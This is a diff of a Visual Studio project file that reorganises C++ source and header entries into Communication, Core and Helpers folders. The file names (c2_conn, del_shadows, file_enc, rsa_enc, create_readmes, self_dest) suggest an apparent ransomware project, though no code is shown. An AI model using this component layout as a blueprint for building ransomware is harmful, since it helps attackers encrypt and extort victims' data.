@@ -130,48 +130,45 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="c2_conn.cpp" />
-    <ClCompile Include="check_perms.cpp" />
-    <ClCompile Include="create_readmes.cpp" />
-    <ClCompile Include="del_shadows.cpp" />
-    <ClCompile Include="disk_id.cpp" />
-    <ClCompile Include="file_enc.cpp" />
-    <ClCompile Include="file_search.cpp" />
-    <ClCompile Include="gen_str.cpp" />
-    <ClCompile Include="gen_uid.cpp" />
-    <ClCompile Include="google_conn.cpp" />
-    <ClCompile Include="kill_procs.cpp" />
+    <ClCompile Include="Communication\c2_conn.cpp" />
+    <ClCompile Include="Communication\google_conn.cpp" />
+    <ClCompile Include="Communication\sendrequest.cpp" />
+    <ClCompile Include="Core\check_perms.cpp" />
+    <ClCompile Include="Core\disk_id.cpp" />
+    <ClCompile Include="Core\file_enc.cpp" />
+    <ClCompile Include="Core\file_search.cpp" />
+    <ClCompile Include="Core\rsa_enc.cpp" />
+    <ClCompile Include="Helpers\create_readmes.cpp" />
+    <ClCompile Include="Helpers\del_shadows.cpp" />
+    <ClCompile Include="Helpers\gen_str.cpp" />
+    <ClCompile Include="Helpers\gen_uid.cpp" />
+    <ClCompile Include="Helpers\kill_procs.cpp" />
+    <ClCompile Include="Helpers\msg_screen.cpp" />
+    <ClCompile Include="Helpers\profiler.cpp" />
+    <ClCompile Include="Helpers\self_dest.cpp" />
+    <ClCompile Include="Helpers\system_id.cpp" />
     <ClCompile Include="main.cpp" />
-    <ClCompile Include="msg_screen.cpp" />
-    <ClCompile Include="profiler.cpp" />
-    <ClCompile Include="rsa_enc.cpp" />
-    <ClCompile Include="self_dest.cpp" />
-    <ClCompile Include="sendrequest.cpp" />
-    <ClCompile Include="system_id.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="c2_conn.h" />
-    <ClInclude Include="check_perms.h" />
-    <ClInclude Include="create_readmes.h" />
-    <ClInclude Include="del_shadows.h" />
-    <ClInclude Include="disk_id.h" />
-    <ClInclude Include="file_enc.h" />
-    <ClInclude Include="file_search.h" />
-    <ClInclude Include="gen_str.h" />
-    <ClInclude Include="gen_uid.h" />
-    <ClInclude Include="google_conn.h" />
-    <ClInclude Include="json.hpp" />
-    <ClInclude Include="kill_procs.h" />
-    <ClInclude Include="merge_dics.h" />
-    <ClInclude Include="msg_screen.h" />
-    <ClInclude Include="profiler.h" />
-    <ClInclude Include="rsa_enc.h" />
-    <ClInclude Include="self_dest.h" />
-    <ClInclude Include="sendrequest.h" />
-    <ClInclude Include="system_id.h" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="packages.config" />
+    <ClInclude Include="Communication\c2_conn.h" />
+    <ClInclude Include="Communication\google_conn.h" />
+    <ClInclude Include="Communication\sendrequest.h" />
+    <ClInclude Include="Core\check_perms.h" />
+    <ClInclude Include="Core\disk_id.h" />
+    <ClInclude Include="Core\file_enc.h" />
+    <ClInclude Include="Core\file_search.h" />
+    <ClInclude Include="Core\rsa_enc.h" />
+    <ClInclude Include="Helpers\create_readmes.h" />
+    <ClInclude Include="Helpers\del_shadows.h" />
+    <ClInclude Include="Helpers\gen_str.h" />
+    <ClInclude Include="Helpers\gen_uid.h" />
+    <ClInclude Include="Helpers\json.hpp" />
+    <ClInclude Include="Helpers\kill_procs.h" />
+    <ClInclude Include="Helpers\merge_dics.h" />
+    <ClInclude Include="Helpers\msg_screen.h" />
+    <ClInclude Include="Helpers\profiler.h" />
+    <ClInclude Include="Helpers\self_dest.h" />
+    <ClInclude Include="Helpers\system_id.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
